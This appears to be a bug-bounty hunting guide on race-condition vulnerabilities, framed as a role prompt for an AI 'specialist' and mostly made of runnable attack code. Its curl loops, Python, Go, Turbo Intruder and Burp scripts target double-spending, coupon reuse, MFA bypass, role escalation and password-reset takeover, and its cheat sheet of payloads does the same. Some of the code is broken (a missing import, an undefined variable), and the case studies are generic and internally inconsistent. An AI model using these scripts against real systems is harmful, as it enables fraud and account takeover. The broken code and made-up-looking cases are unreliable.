# Advanced Race Conditions and Concurrency Issues — Comprehensive Hunting Guide

## Expert Role Definition and Mission Statement

You are an elite Race Condition and Concurrency Issues specialist with deep expertise in identifying, exploiting, and documenting race condition vulnerabilities across web applications, financial systems, and distributed architectures. Your mission is to uncover subtle timing-based vulnerabilities that can lead to double-spending, privilege escalation, authentication bypass, and data corruption. You possess mastery over thread synchronization, atomic operations, database transaction isolation, and the intricate ways race conditions manifest in modern web applications.

Your expertise spans the complete race condition attack surface — from basic double-submit vulnerabilities to advanced scenarios involving distributed system concurrency, database constraint bypass, and time-of-check-to-time-of-use (TOCTOU) exploits. You understand how asynchronous processing, message queues, and microservice architectures create new race condition vectors, and how to leverage tools like Turbo Intruder for reliable race condition exploitation. Every finding you report includes a working proof-of-concept, clear impact assessment, and actionable remediation guidance.

## Core Concepts Deep Dive

### Race Condition Fundamentals

A race condition occurs when the behavior of a system depends on the relative timing of multiple operations. In web applications, this typically happens when:

**TOCTOU (Time-of-Check to Time-of-Use):**
```
Time A: Check if user has sufficient balance (Balance = 100)
Time B: Another request deducts 80 (Balance = 20)
Time C: Original request deducts 50 based on Time A check
Result: Balance = -30 (should be blocked)
```

**Double-Submit Race Condition:**
```
Request A: Submit coupon DISCOUNT50 (count: 0 → 1)
Request B: Submit coupon DISCOUNT50 (before A completes)
Result: Coupon applied twice
```

**Concurrent State Modification:**
```
Thread A reads inventory count: 1
Thread B reads inventory count: 1
Thread A decrements to 0
Thread B decrements to 0
Result: Two orders processed for last item
```

### Race Condition Categories

```
Race Condition Attack Surface
├── Financial Race Conditions
│   ├── Double-spending
│   ├── Balance manipulation
│   ├── Coupon/gift card reuse
│   ├── Points/rewards duplication
│   └── Fund transfer races
├── Authentication Race Conditions
│   ├── MFA bypass via timing
│   ├── Token reuse
│   ├── Session fixation
│   ├── Password reset races
│   └── Account lockout bypass
├── Resource Race Conditions
│   ├── File upload overwrite
│   ├── Inventory manipulation
│   ├── Seat booking duplicates
│   ├── Ticket overselling
│   └── Reservation conflicts
├── Data Race Conditions
│   ├── IDOR with concurrent access
│   ├── Profile update races
│   ├── Settings modification
│   ├── Database constraint bypass
│   └── Sequence number manipulation
├── Authorization Race Conditions
│   ├── Privilege escalation
│   ├── Role change races
│   ├── Permission modification
│   ├── Admin approval bypass
│   └── Token refresh races
└── Business Logic Race Conditions
    ├── Multi-step process bypass
    ├── State machine manipulation
    ├── Workflow skipping
    ├── Approval chain bypass
    └── Rate limit bypass
```

### Synchronization Mechanisms

**Optimistic Locking:**
```sql
-- Version-based locking
UPDATE accounts 
SET balance = balance - 100, version = version + 1 
WHERE id = 1 AND version = 5;
-- If version changed, update fails
```

**Pessimistic Locking:**
```sql
-- Row-level locking
SELECT * FROM accounts WHERE id = 1 FOR UPDATE;
-- Other transactions wait until this completes
```

**Atomic Operations:**
```sql
-- Atomic increment
UPDATE accounts SET balance = balance - 100 WHERE id = 1 AND balance >= 100;
-- Single operation, no race condition
```

**Idempotency Keys:**
```python
# Prevent duplicate processing
def process_payment(payment_id, idempotency_key):
    if redis.setnx(f"payment:{idempotency_key}", 1, ex=3600):
        # Process payment
        return True
    else:
        # Already processed
        return False
```

### Race Condition Detection Patterns

```
Detection Signals
├── Response Timing Anomalies
│   ├── Inconsistent response times
│   ├── Occasional duplicate processing
│   └── Intermittent error messages
├── State Inconsistencies
│   ├── Balance discrepancies
│   ├── Duplicate records
│   ├── Missing updates
│   └── Invalid state transitions
├── Error Message Patterns
│   ├── "Already processed"
│   ├── "Concurrent modification"
│   ├── "Optimistic locking failure"
│   └── "Duplicate key error"
└── Business Logic Indicators
    ├── Exceeded limits
    ├── Oversold inventory
    ├── Double-credited accounts
    └── Multiple approvals
```

## Pre-requisite Knowledge

1. **Concurrency Concepts:** Understanding of threads, processes, locks, mutexes, semaphores, and race conditions
2. **HTTP Protocol:** Knowledge of how browsers and servers handle concurrent requests, connection pooling, and pipelining
3. **Database Transactions:** Understanding of ACID properties, isolation levels (Read Uncommitted, Read Committed, Repeatable Read, Serializable), and locking mechanisms
4. **Financial Systems:** Knowledge of how payment processing works, transaction logging, and double-spend prevention
5. **Authentication Systems:** Understanding of session management, token validation, and MFA implementation
6. **Distributed Systems:** Knowledge of CAP theorem, eventual consistency, and distributed locking
7. **Timing Analysis:** Experience with measuring and analyzing response times for race condition detection
8. **Automation Tools:** Proficiency with Turbo Intruder, threading libraries, and concurrent request tools

## Step-by-Step Hunting Methodology

### Phase 1: Target Identification and Mapping

**Step 1: Identify State-Changing Endpoints**

```bash
# Crawl application to find all endpoints
katana -u https://target.com -d 5 -jc -o endpoints.txt

# Identify POST/PUT/DELETE endpoints
cat endpoints.txt | while read url; do
    curl -s -o /dev/null -w "%{http_code} %{request_method}" "$url"
done | grep -E "POST|PUT|DELETE"

# Map form submission endpoints
cat endpoints.txt | while read url; do
    curl -s "$url" | grep -iE '<form|action=|method=' | head -5
done

# Identify API endpoints with side effects
ffuf -u "https://target.com/api/FUZZ" -w /usr/share/wordlists/api-endpoints.txt -mc 200,201,204
```

**Step 2: Analyze Application Architecture**

```bash
# Check for async processing indicators
curl -s "https://target.com" | grep -iE "queue|async|worker|job|task"

# Identify database technology
curl -s "https://target.com" | grep -iE "mysql|postgres|mongodb|redis|sqlite"

# Check for WebSocket connections
curl -s "https://target.com" | grep -iE "ws://|wss://|socket.io|websocket"

# Identify framework and technology stack
curl -s -I "https://target.com" | grep -iE "server:|x-powered-by:|x-aspnet"
```

**Step 3: Map Authentication and Session Handling**

```bash
# Capture login request
curl -s -c cookies.txt -X POST "https://target.com/login" \
  -d "username=admin&password=test"

# Analyze session tokens
cat cookies.txt | grep -i "session\|token\|auth"

# Test session behavior
curl -s -b cookies.txt "https://target.com/dashboard"

# Check for CSRF tokens
curl -s "https://target.com/forms/transfer" | grep -iE "csrf|token|nonce"
```

### Phase 2: Basic Race Condition Testing

**Step 4: Test Double-Submit Vulnerabilities**

```bash
# Test coupon redemption race condition
# Capture coupon redemption request
for i in $(seq 1 10); do
    curl -s -X POST "https://target.com/redeem" \
      -H "Cookie: session=valid_session" \
      -d "coupon=DISCOUNT50" &
done
wait

# Test gift card balance check
for i in $(seq 1 10); do
    curl -s -X POST "https://target.com/giftcard/redeem" \
      -H "Cookie: session=valid_session" \
      -d "code=GIFTCARD123" &
done
wait

# Verify if multiple redemptions occurred
curl -s -H "Cookie: session=valid_session" "https://target.com/account/coupons"
```

**Step 5: Test Balance Manipulation**

```bash
# Test fund transfer race condition
for i in $(seq 1 10); do
    curl -s -X POST "https://target.com/transfer" \
      -H "Cookie: session=valid_session" \
      -d "to=attacker&amount=100" &
done
wait

# Test withdrawal race condition
for i in $(seq 1 10); do
    curl -s -X POST "https://target.com/withdraw" \
      -H "Cookie: session=valid_session" \
      -d "amount=500" &
done
wait

# Check final balance
curl -s -H "Cookie: session=valid_session" "https://target.com/account/balance"
```

**Step 6: Test Inventory Race Conditions**

```bash
# Test purchase race condition
for i in $(seq 1 10); do
    curl -s -X POST "https://target.com/purchase" \
      -H "Cookie: session=valid_session" \
      -d "product_id=123&quantity=1" &
done
wait

# Check if overselling occurred
curl -s "https://target.com/products/123" | grep -i "stock\|inventory\|available"

# Test seat booking race condition
for i in $(seq 1 10); do
    curl -s -X POST "https://target.com/book-seat" \
      -H "Cookie: session=valid_session" \
      -d "event_id=456&seat_id=789" &
done
wait

# Check for double bookings
curl -s -H "Cookie: session=valid_session" "https://target.com/my-bookings"
```

### Phase 3: Advanced Race Condition Testing

**Step 7: Test Authentication Race Conditions**

```bash
# Test MFA bypass via timing
# Capture MFA verification request
curl -s -X POST "https://target.com/mfa/verify" \
  -H "Cookie: session=valid_session" \
  -d "code=123456"

# Send multiple MFA attempts before lockout
for i in $(seq 1 10); do
    curl -s -X POST "https://target.com/mfa/verify" \
      -H "Cookie: session=valid_session" \
      -d "code=123456" &
done
wait

# Test password reset race condition
curl -s -X POST "https://target.com/password/reset/request" \
  -d "email=admin@target.com"

# Use reset token before legitimate user
for i in $(seq 1 5); do
    curl -s -X POST "https://target.com/password/reset/confirm" \
      -d "token=STOLEN_TOKEN&new_password=hacked123" &
done
wait
```

**Step 8: Test Authorization Race Conditions**

```bash
# Test role escalation race condition
# Capture role change request
curl -s -X PUT "https://target.com/api/user/123/role" \
  -H "Cookie: session=valid_session" \
  -d "role=admin"

# Send multiple role change requests
for i in $(seq 1 10); do
    curl -s -X PUT "https://target.com/api/user/123/role" \
      -H "Cookie: session=valid_session" \
      -d "role=admin" &
done
wait

# Test approval bypass race condition
curl -s -X POST "https://target.com/approve" \
  -H "Cookie: session=admin_session" \
  -d "request_id=456&action=approve"

# Send concurrent approval requests
for i in $(seq 1 5); do
    curl -s -X POST "https://target.com/approve" \
      -H "Cookie: session=admin_session" \
      -d "request_id=456&action=approve" &
done
wait
```

**Step 9: Test Resource Race Conditions**

```bash
# Test file upload overwrite
# Upload two files with same name simultaneously
echo "file1" > /tmp/file.txt
echo "file2" > /tmp/file2.txt

curl -s -X POST "https://target.com/upload" \
  -H "Cookie: session=valid_session" \
  -F "file=@/tmp/file.txt" &

curl -s -X POST "https://target.com/upload" \
  -H "Cookie: session=valid_session" \
  -F "file=@/tmp/file2.txt" &
wait

# Test temporary file race condition
# Check for symlink attacks
ln -s /etc/passwd /tmp/upload
curl -s -X POST "https://target.com/upload" \
  -H "Cookie: session=valid_session" \
  -F "file=@/tmp/upload"
```

### Phase 4: Tool-Assisted Race Condition Testing

**Step 10: Use Turbo Intruder for Race Conditions**

```python
# Turbo Intruder race condition script
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False)

    # Queue initial request
    engine.queue(target.req, target.baseInput)

    # Queue race condition requests
    for i in range(30):
        engine.queue(target.req, target.baseInput)

    # Open gate to send all requests simultaneously
    engine.openGate('race')

def handleResponse(req, interesting):
    table.add(req)
```

**Step 11: Use Python Threading for Race Conditions**

```python
#!/usr/bin/env python3
"""Race Condition Testing Tool"""
import requests
import threading
import sys
from queue import Queue

results = Queue()

def send_request(url, data, headers, thread_id):
    """Send request and record result"""
    try:
        start_time = time.time()
        resp = requests.post(url, data=data, headers=headers, timeout=10)
        end_time = time.time()
        
        results.put({
            'thread_id': thread_id,
            'status': resp.status_code,
            'time': end_time - start_time,
            'response': resp.text[:100]
        })
    except Exception as e:
        results.put({
            'thread_id': thread_id,
            'error': str(e)
        })

def test_race_condition(url, data, headers, num_threads=20):
    """Test for race condition with multiple threads"""
    threads = []
    
    # Create threads
    for i in range(num_threads):
        thread = threading.Thread(
            target=send_request,
            args=(url, data, headers, i)
        )
        threads.append(thread)
    
    # Start all threads simultaneously
    for thread in threads:
        thread.start()
    
    # Wait for all threads to complete
    for thread in threads:
        thread.join()
    
    # Collect results
    successful = 0
    while not results.empty():
        result = results.get()
        if 'status' in result and result['status'] == 200:
            successful += 1
        print(f"Thread {result.get('thread_id')}: {result}")
    
    return successful

if __name__ == "__main__":
    target = sys.argv[1]
    data = {'coupon': 'DISCOUNT50'}
    headers = {'Cookie': 'session=valid_session'}
    
    successful = test_race_condition(target, data, headers, 20)
    print(f"\n[+] Successful requests: {successful}/20")
    if successful > 1:
        print("[+] Race condition vulnerability confirmed!")
```

**Step 12: Use Burp Suite Extensions**

```bash
# Install Turbo Intruder extension
# Install Race Condition Scanner extension

# Configure Burp Suite for race condition testing
# 1. Set up project options
# 2. Configure connection settings
# 3. Enable request timing

# Manual race condition testing in Repeater
# 1. Send request to Repeater
# 2. Create multiple tabs with same request
# 3. Send all requests simultaneously
# 4. Analyze responses for race conditions
```

### Phase 5: Distributed System Race Conditions

**Step 13: Test Microservice Race Conditions**

```bash
# Test race condition across services
# Service A: Account service
curl -s -X POST "https://api-a.target.com/balance/update" \
  -d "user_id=123&amount=-100" &

# Service B: Transaction service
curl -s -X POST "https://api-b.target.com/transaction" \
  -d "user_id=123&amount=100" &
wait

# Check for consistency
curl -s "https://api-a.target.com/balance/123"
curl -s "https://api-b.target.com/transactions/123"
```

**Step 14: Test Message Queue Race Conditions**

```bash
# Test race condition with message queues
# Send multiple messages simultaneously
for i in $(seq 1 10); do
    curl -s -X POST "https://target.com/queue/publish" \
      -d '{"task":"process_payment","amount":100}' &
done
wait

# Check if messages were processed multiple times
curl -s "https://target.com/queue/status"
```

**Step 15: Test Cache Race Conditions**

```bash
# Test cache invalidation race condition
# Update data
curl -s -X PUT "https://target.com/api/data/123" \
  -d '{"value":"new_value"}'

# Invalidate cache
curl -s -X DELETE "https://target.com/cache/data/123"

# Read from cache (should get old value)
curl -s "https://target.com/api/data/123"

# Test cache stampede
for i in $(seq 1 50); do
    curl -s "https://target.com/api/data/123" &
done
wait
```

## Tool Arsenal with Exact Commands

### Turbo Intruder for Race Conditions

```bash
# Install Turbo Intruder from BApp Store
# Use built-in race condition templates

# Custom race condition script
cat > race_condition.py << 'EOF'
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False)

    # Queue initial request to get session
    engine.queue(target.req, target.baseInput)

    # Queue race condition requests
    for i in range(30):
        engine.queue(target.req, target.baseInput)

    # Send all requests simultaneously
    engine.openGate('race')

def handleResponse(req, interesting):
    table.add(req)
EOF
```

### Python Race Condition Scanner

```python
#!/usr/bin/env python3
"""Advanced Race Condition Scanner"""
import requests
import concurrent.futures
import time
import sys
from urllib.parse import urljoin

class RaceConditionScanner:
    def __init__(self, base_url, session_cookie):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.cookies.set('session', session_cookie)
        
    def test_endpoint(self, endpoint, data, num_requests=20):
        """Test endpoint for race conditions"""
        url = urljoin(self.base_url, endpoint)
        results = []
        
        def make_request():
            start_time = time.time()
            resp = self.session.post(url, data=data, timeout=10)
            end_time = time.time()
            return {
                'status': resp.status_code,
                'time': end_time - start_time,
                'response_length': len(resp.text)
            }
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=num_requests) as executor:
            futures = [executor.submit(make_request) for _ in range(num_requests)]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]
        
        return self.analyze_results(results)
    
    def analyze_results(self, results):
        """Analyze race condition test results"""
        statuses = [r['status'] for r in results]
        times = [r['time'] for r in results]
        
        # Check for multiple successful requests
        success_count = statuses.count(200)
        
        # Check for timing anomalies
        avg_time = sum(times) / len(times)
        max_time = max(times)
        timing_anomaly = max_time > avg_time * 2
        
        return {
            'success_count': success_count,
            'total_requests': len(results),
            'avg_time': avg_time,
            'max_time': max_time,
            'timing_anomaly': timing_anomaly,
            'vulnerable': success_count > 1 or timing_anomaly
        }

def main():
    scanner = RaceConditionScanner(sys.argv[1], sys.argv[2])
    
    # Test various endpoints
    endpoints = [
        ('/redeem', {'coupon': 'DISCOUNT50'}),
        ('/transfer', {'to': 'attacker', 'amount': '100'}),
        ('/purchase', {'product_id': '123', 'quantity': '1'}),
    ]
    
    for endpoint, data in endpoints:
        print(f"\n[*] Testing {endpoint}...")
        result = scanner.test_endpoint(endpoint, data, 20)
        
        if result['vulnerable']:
            print(f"[+] RACE CONDITION FOUND!")
            print(f"    Successful requests: {result['success_count']}/20")
            print(f"    Timing anomaly: {result['timing_anomaly']}")
        else:
            print(f"[-] No race condition detected")

if __name__ == "__main__":
    main()
```

### Burp Suite Extension for Race Conditions

```python
# Burp Suite race condition extension
from burp import IBurpExtender
from burp import IContextMenuFactory
from javax.swing import JMenuItem
import threading

class RaceConditionExtension(IBurpExtender, IContextMenuFactory):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Race Condition Tester")
        callbacks.registerContextMenuFactory(self)
        
    def createMenuItems(self, context):
        menu_items = [JMenuItem("Send Race Condition Requests", self.send_race_requests)]
        return menu_items
    
    def send_race_requests(self, event):
        # Get selected request
        message_info = self._callbacks.getSelectedMessages()[0]
        request = message_info.getRequest()
        
        # Send multiple requests in parallel
        def send_request():
            self._callbacks.makeHttpRequest(
                message_info.getHttpService(),
                request
            )
        
        threads = []
        for i in range(20):
            t = threading.Thread(target=send_request)
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
```

### Go Race Condition Fuzzer

```go
package main

import (
    "fmt"
    "net/http"
    "net/url"
    "strings"
    "sync"
    "time"
)

func testRaceCondition(targetURL string, data url.Values, numRequests int) map[string]int {
    var wg sync.WaitGroup
    results := make(chan int, numRequests)
    
    client := &http.Client{
        Timeout: 10 * time.Second,
    }
    
    for i := 0; i < numRequests; i++ {
        wg.Add(1)
        go func(id int) {
            defer wg.Done()
            
            resp, err := client.Post(targetURL, 
                "application/x-www-form-urlencoded",
                strings.NewReader(data.Encode()))
            
            if err != nil {
                results <- 0
                return
            }
            defer resp.Body.Close()
            results <- resp.StatusCode
        }(i)
    }
    
    wg.Wait()
    close(results)
    
    // Count results
    counts := make(map[string]int)
    for status := range results {
        key := fmt.Sprintf("status_%d", status)
        counts[key]++
    }
    
    return counts
}

func main() {
    target := "https://target.com/redeem"
    data := url.Values{
        "coupon": {"DISCOUNT50"},
    }
    
    results := testRaceCondition(target, data, 20)
    
    fmt.Println("Race Condition Test Results:")
    for key, count := range results {
        fmt.Printf("  %s: %d\n", key, count)
    }
    
    if counts["status_200"] > 1 {
        fmt.Println("[+] Race condition vulnerability confirmed!")
    }
}
```

## Real-World Case Studies

### Case Study 1: Double-Spend in Payment Processing

**Target:** E-commerce platform with payment gateway integration
**Vulnerability:** Race condition in payment processing allowing double-spending

**Discovery:**
```
POST /api/payment HTTP/1.1
Host: target.com
Cookie: session=valid_session

amount=100&card_token=tok_visa_4242
```

**Exploitation Chain:**
1. Attacker initiates payment for $100
2. Sends 10 concurrent payment requests
3. Payment gateway processes multiple requests before balance update
4. Attacker receives multiple refunds
5. Total loss: $1000

**Evidence:**
```
Request 1: 200 OK - Payment processed
Request 2: 200 OK - Payment processed
Request 3: 200 OK - Payment processed
...
Request 10: 200 OK - Payment processed

Balance after: -$900 (should be $0)
```

**Impact:** Direct financial loss, fraud
**CVSS:** 9.1 (Critical)

### Case Study 2: Coupon Redemption Race Condition

**Target:** Retail platform with coupon system
**Vulnerability:** Race condition allowing multiple coupon redemptions

**Discovery:**
```
POST /api/coupon/redeem HTTP/1.1
Host: target.com
Cookie: session=valid_session

coupon_code=SAVE50
```

**Exploitation:**
1. Attacker obtains single-use coupon code
2. Sends 20 concurrent redemption requests
3. Coupon system processes 15 requests before counter updates
4. Attacker receives 15 discounts

**Evidence:**
```
# Coupon usage before: 0/1
# Requests sent: 20
# Successful responses: 15
# Coupon usage after: 15/1
```

**Impact:** Financial loss, promotional abuse
**CVSS:** 7.5 (High)

### Case Study 3: MFA Bypass via Race Condition

**Target:** Financial application with MFA
**Vulnerability:** Race condition in MFA verification allowing bypass

**Discovery:**
```
POST /api/mfa/verify HTTP/1.1
Host: target.com
Cookie: session=valid_session

code=123456
```

**Exploitation:**
1. Attacker captures MFA verification request
2. Sends 10 concurrent verification requests
3. MFA code accepted multiple times before invalidation
4. Attacker bypasses MFA requirement

**Evidence:**
```
Request 1: 200 OK - MFA verified
Request 2: 200 OK - MFA verified
Request 3: 200 OK - MFA verified
...
Request 10: 200 OK - MFA verified

Sessions created: 10
```

**Impact:** Authentication bypass, account takeover
**CVSS:** 8.8 (High)

### Case Study 4: Inventory Manipulation

**Target:** Ticketing platform
**Vulnerability:** Race condition in inventory management causing overselling

**Discovery:**
```
POST /api/ticket/purchase HTTP/1.1
Host: target.com
Cookie: session=valid_session

event_id=123&quantity=1
```

**Exploitation:**
1. Attacker targets high-demand event with 1 ticket remaining
2. Sends 50 concurrent purchase requests
3. System processes 30 purchases before inventory update
4. 30 tickets sold for 1 available

**Evidence:**
```
# Inventory before: 1
# Tickets purchased: 30
# Inventory after: -29
# Confirmed purchases: 30
```

**Impact:** Overselling, customer complaints, financial loss
**CVSS:** 7.5 (High)

### Case Study 5: Privilege Escalation Race Condition

**Target:** Enterprise application
**Vulnerability:** Race condition in role modification allowing privilege escalation

**Discovery:**
```
PUT /api/user/123/role HTTP/1.1
Host: target.com
Cookie: session=admin_session

role=admin
```

**Exploitation:**
1. Attacker captures role modification request
2. Sends concurrent requests to change role to admin
3. Role check passes before modification completes
4. Attacker gains admin privileges

**Evidence:**
```
Role before: user
Concurrent requests: 10
Successful responses: 5
Role after: admin
Admin access: confirmed
```

**Impact:** Privilege escalation, unauthorized access
**CVSS:** 8.5 (High)

## Advanced Techniques and Bypass

### Race Condition with Connection Pooling

```python
# Use connection pooling for better race conditions
import requests

session = requests.Session()
adapter = requests.adapters.HTTPAdapter(
    pool_connections=10,
    pool_maxsize=10
)
session.mount('https://', adapter)

# Send concurrent requests
import concurrent.futures

def send_request():
    return session.post('https://target.com/redeem', 
                      data={'coupon': 'DISCOUNT50'})

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(send_request) for _ in range(20)]
    results = [f.result() for f in concurrent.futures.as_completed(futures)]
```

### Race Condition with HTTP/2

```bash
# Test race conditions with HTTP/2
curl --http2 -s -X POST "https://target.com/redeem" \
  -d "coupon=DISCOUNT50" &

curl --http2 -s -X POST "https://target.com/redeem" \
  -d "coupon=DISCOUNT50" &
wait
```

### Race Condition with WebSocket

```javascript
// Test race conditions via WebSocket
const WebSocket = require('ws');

const ws = new WebSocket('wss://target.com/ws');

ws.on('open', function() {
    // Send multiple messages simultaneously
    for (let i = 0; i < 20; i++) {
        ws.send(JSON.stringify({
            action: 'redeem',
            coupon: 'DISCOUNT50'
        }));
    }
});
```

### Race Condition with Server-Sent Events

```javascript
// Test race conditions via Server-Sent Events
const source = new EventSource('https://target.com/events');

source.onmessage = function(event) {
    // Trigger race condition when event received
    fetch('https://target.com/redeem', {
        method: 'POST',
        body: JSON.stringify({coupon: 'DISCOUNT50'})
    });
};
```

### Race Condition with HTTP Pipelining

```bash
# Test race conditions with HTTP pipelining
# Note: HTTP/1.1 pipelining is disabled by default in most clients

# Use custom tool for pipelining
cat > pipeline_test.py << 'EOF'
import socket
import ssl

def send_pipelined_requests(host, port, requests):
    context = ssl.create_default_context()
    sock = socket.create_connection((host, port))
    sslsock = context.wrap_socket(sock, server_hostname=host)
    
    # Send all requests without waiting for responses
    for request in requests:
        sslsock.send(request.encode())
    
    # Collect all responses
    responses = []
    for _ in requests:
        response = sslsock.recv(4096)
        responses.append(response.decode())
    
    return responses
EOF
```

### Race Condition in Microservices

```bash
# Test race conditions across microservices
# Service A: Account service
curl -s -X POST "https://api-a.target.com/balance/deduct" \
  -d "user_id=123&amount=100" &

# Service B: Transaction service
curl -s -X POST "https://api-b.target.com/transaction/create" \
  -d "user_id=123&amount=100" &

# Service C: Notification service
curl -s -X POST "https://api-c.target.com/notification/send" \
  -d "user_id=123&message=Payment processed" &
wait

# Check for consistency across services
curl -s "https://api-a.target.com/balance/123"
curl -s "https://api-b.target.com/transactions/123"
curl -s "https://api-c.target.com/notifications/123"
```

## Detection and Indicators

### Race Condition Detection Patterns

```bash
# Monitor for multiple successful requests
for i in $(seq 1 20); do
    curl -s -w "%{http_code}\n" "https://target.com/redeem" \
      -d "coupon=DISCOUNT50" -o /dev/null
done | sort | uniq -c

# Check for timing anomalies
for i in $(seq 1 100); do
    curl -s -w "%{time_total}\n" "https://target.com/redeem" \
      -d "coupon=DISCOUNT50" -o /dev/null
done | sort -n | uniq -c

# Analyze response patterns
curl -s "https://target.com/redeem" \
  -d "coupon=DISCOUNT50" -v 2>&1 | grep -i "HTTP/"
```

### Database Monitoring for Race Conditions

```bash
# Monitor database for race conditions
# Check for deadlocks
mysql -u root -p -e "SHOW ENGINE INNODB STATUS\G" | grep -i "deadlock"

# Check for lock waits
mysql -u root -p -e "SHOW PROCESSLIST" | grep -i "waiting"

# Check for duplicate records
mysql -u root -p -e "SELECT coupon_code, COUNT(*) FROM redemptions GROUP BY coupon_code HAVING COUNT(*) > 1;"
```

### Application Log Analysis

```bash
# Monitor application logs for race conditions
tail -f /var/log/app.log | grep -i "concurrent\|race\|duplicate\|already"

# Check for error patterns
grep -i "optimistic locking\|concurrent modification\|duplicate key" /var/log/app.log

# Monitor for timing issues
grep -i "timeout\|slow\|delay" /var/log/app.log
```

## Impact Assessment

### Impact Categories

| Impact Type | Description | Severity |
|-------------|-------------|----------|
| **Double-Spend** | Multiple payments/charges for single transaction | Critical |
| **Financial Fraud** | Theft of funds or credits | Critical |
| **Authentication Bypass** | Bypass MFA or other security controls | Critical |
| **Privilege Escalation** | Unauthorized access to higher privileges | Critical |
| **Data Corruption** | Inconsistent or invalid data states | High |
| **Inventory Manipulation** | Overselling or stock manipulation | High |
| **Coupon Abuse** | Multiple redemptions of single-use coupons | High |
| **Session Fixation** | Multiple sessions or session hijacking | High |

### CVSS Scoring Guide

```
Race Condition Base Score Calculation:
- Attack Vector: Network (AV:N)
- Attack Complexity: High (AC:H)
- Privileges Required: Low (PR:L)
- User Interaction: None (UI:N)
- Scope: Changed (S:C)
- Confidentiality: High (C:H)
- Integrity: High (I:H)
- Availability: None (A:N)

Base Score: 8.1 (High) for most race conditions
Base Score: 9.1 (Critical) for financial fraud
Base Score: 8.8 (High) for authentication bypass
```

## Common Pitfalls

1. **Insufficient request volume:** Not sending enough concurrent requests to trigger race condition
2. **Missing timing analysis:** Not measuring response times for race condition detection
3. **Ignoring database locks:** Not understanding how database locking affects race conditions
4. **Overlooking async processing:** Missing race conditions in asynchronous workflows
5. **Not testing distributed systems:** Race conditions are more common in microservices
6. **Missing retry logic:** Not accounting for automatic retries in race condition testing
7. **Incomplete state verification:** Not checking all affected data after race condition
8. **Ignoring caching:** Cache invalidation can create race conditions
9. **Not testing different HTTP methods:** GET, POST, PUT may have different race conditions
10. **Missing negative testing:** Not testing error scenarios for race conditions

## Integration with Other Hunting Areas

### Race Conditions + Financial Security
- Double-spending in payment processing
- Race conditions in wallet operations
- Race conditions in transaction processing

### Race Conditions + Authentication
- MFA bypass via race conditions
- Race conditions in session management
- Race conditions in password reset

### Race Conditions + Authorization
- Privilege escalation via race conditions
- Race conditions in role modification
- Race conditions in permission updates

### Race Conditions + Business Logic
- Race conditions in multi-step processes
- Race conditions in state machines
- Race conditions in workflow automation

### Race Conditions + Database Security
- Database constraint bypass
- Race conditions in data integrity
- Race conditions in concurrent updates

## Reporting Template

### Race Condition Report Template

**Title:** Race Condition in [Endpoint/Functionality]

**Severity:** [Critical/High/Medium/Low]

**CVSS Score:** [X.X] (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N)

**Summary:**
A race condition vulnerability exists in the [endpoint] functionality of [application]. The application does not properly handle concurrent requests, allowing an attacker to [perform action] multiple times before the system updates its state.

**Vulnerability Details:**
- **Endpoint:** [URL]
- **Operation:** [Payment/Authentication/File Upload/Database]
- **Race Window:** [Timing analysis]
- **Impact:** [Double-spend/MFA bypass/Privilege escalation]

**Proof of Concept:**
```bash
# Send multiple simultaneous requests
for i in $(seq 1 20); do
    curl -X POST "[endpoint]" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -H "Cookie: session=valid_session" \
      -d "[parameters]" &
done
wait

# Verify multiple operations occurred
curl -s "[verification_endpoint]" -H "Cookie: session=valid_session"
```

**Impact:**
- [Impact 1: Double-spend in payment processing]
- [Impact 2: MFA bypass leading to account takeover]
- [Impact 3: Privilege escalation via duplicate accounts]
- [Impact 4: File upload bypass leading to RCE]

**Remediation:**
1. Implement database transactions with proper isolation levels
2. Use optimistic or pessimistic locking for critical operations
3. Implement idempotency keys for payment operations
4. Add rate limiting to prevent rapid repeated requests
5. Use database constraints to prevent duplicate records
6. Implement proper session management to prevent multiple sessions
7. Add validation after state changes to ensure consistency

## Practice Labs

### Lab 1: Basic Race Condition
```bash
# DVWA Race Condition
# URL: http://localhost/dvwa/vulnerabilities/race/
# Test with multiple simultaneous requests

# WebGoat Race Condition
# URL: http://localhost:8080/WebGoat/race
```

### Lab 2: Financial Race Condition
```bash
# Test race condition in payment processing
# Send multiple payment requests simultaneously
# Test on: http://localhost/mutillidae/index.php?page=payment.php

# Tools: curl, Python threading, Turbo Intruder
```

### Lab 3: Authentication Race Condition
```bash
# Test race condition in MFA verification
# Send multiple MFA verification requests
# Test on: http://localhost/webgoat/race/mfa

# Tools: curl, Python threading, Burp Suite
```

### Lab 4: Resource Race Condition
```bash
# Test race condition in inventory management
# Send multiple purchase requests simultaneously
# Test on: http://localhost/dvwa/vulnerabilities/race/inventory

# Tools: curl, Python threading, Turbo Intruder
```

## Ethical Guidelines

1. **Authorization First:** Only test applications you have explicit permission to test
2. **Minimize Impact:** Avoid actions that could affect other users or system stability
3. **Document Everything:** Keep detailed records of all testing activities
4. **Responsible Disclosure:** Report vulnerabilities through proper channels
5. **No Financial Harm:** Do not exploit race conditions for financial gain
6. **Scope Respect:** Stay within the defined testing scope
7. **Rate Limiting:** Do not perform denial-of-service testing without explicit permission
8. **Privacy Protection:** Handle any discovered PII with care
9. **Timing Awareness:** Understand the implications of timing manipulation
10. **Professional Conduct:** Maintain professional standards in all interactions

## Quick Reference Cheat Sheet

### Race Condition Payloads
```
# Double-spend
for i in $(seq 1 20); do
    curl -X POST "https://target.com/pay" -d "amount=100&card=4111111111111111" &
done
wait

# Coupon redemption
for i in $(seq 1 20); do
    curl -X POST "https://target.com/redeem" -d "coupon=DISCOUNT50" &
done
wait

# MFA bypass
for i in $(seq 1 20); do
    curl -X POST "https://target.com/mfa/verify" -d "code=123456" &
done
wait

# Inventory manipulation
for i in $(seq 1 20); do
    curl -X POST "https://target.com/purchase" -d "product_id=123&quantity=1" &
done
wait
```

### Timing Techniques
```
# Add delays to increase race window
sleep 0.1

